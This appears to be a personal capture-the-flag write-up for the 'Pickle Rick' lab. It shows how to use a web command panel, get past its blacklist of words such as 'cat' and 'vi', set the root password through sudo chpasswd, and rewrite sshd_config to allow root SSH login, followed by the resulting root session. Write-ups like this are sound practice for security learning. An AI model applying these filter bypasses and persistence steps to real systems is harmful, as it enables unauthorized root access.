2020-12-16


# Tips for command panel

## Redirect stderr to stdout 
`2>&1` allows you to see some more messages

`ls jkdfjdkfj 2>&1` will show error, whereas `ls jskdflkdf` will show nothing, becuase by default stderr isn't collected by the php script.


## Escape special html character to view .php content in the output box:
(Otherwise the browser will interpret it as normal html, and you would have a webpage inside of your box, super creepy)

```
sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g; s/"/\&quot;/g; s/'"'"'/\&#39;/g' [file]
```

## Third ingredient

3rd ingredient in in `/root`

I discovered this when I was trying to configure ssh server.


# My attempt to enable ssh

## Let's set a root password
Assuming we can't have interactive prompt, do this to change password

`echo root:root | sudo chpasswd 2>&1`

## Text manipulation on `/etc/ssh/sshd_config`

- use `sudo tee` here to direct output to file with root privilege
- need get around "Authentication" b/c it contains "cat", which is a forbidden pattern

```bash
VAR=PasswordAuthentica && sed "s/PermitRootLogin prohibit-password/PermitRootLogin yes/" /etc/ssh/sshd_config | sed "s/${VAR}tion no/${VAR}tion yes/" | sudo tee new-sshd
```

## move the new ssh daemon config to the correct place
```bash
sudo mv new-sshd /etc/ssh/sshd_config
```

## restart ssh
We can't use `sudo service restart ssh` b/c `service` contains `vi` which is forbidden...
```bash
sudo systemctl restart ssh
```

Now it works!
```
┌──(known㉿DESKTOP-DTPC4J5)-[~/cyb-python/notes/picklerick/archive]
└─$ ssh root@10.10.255.234
root@10.10.255.234's password:
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-1072-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  Get cloud support with Ubuntu Advantage Cloud Guest:
    http://www.ubuntu.com/business/services/cloud

60 packages can be updated.
43 updates are security updates.



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ip-10-10-255-234:~# ls
3rd.txt  snap
root@ip-10-10-255-234:~#
```

And this makes things a LOT easier:

```
root@ip-10-10-255-234:~# cd
root@ip-10-10-255-234:~# sudo su ubuntu
ubuntu@ip-10-10-255-234:/root$ ls
ls: cannot open directory '.': Permission denied
ubuntu@ip-10-10-255-234:/root$ sudo ls
3rd.txt  snap
ubuntu@ip-10-10-255-234:/root$ cd
ubuntu@ip-10-10-255-234:~$ ls
ubuntu@ip-10-10-255-234:~$ pwd
/home/ubuntu
ubuntu@ip-10-10-255-234:~$ cd ../
ubuntu@ip-10-10-255-234:/home$ ls
rick  ubuntu
ubuntu@ip-10-10-255-234:/home$ cd rick
ubuntu@ip-10-10-255-234:/home/rick$ ls
second ingredients
ubuntu@ip-10-10-255-234:/home/rick$ cat second\ ingredients
1 jerry tear
ubuntu@ip-10-10-255-234:/home/rick$ exit
exit
root@ip-10-10-255-234:~# sudo su rick
No passwd entry for user 'rick'
root@ip-10-10-255-234:~# sudo su ubuntu
ubuntu@ip-10-10-255-234:/root$
```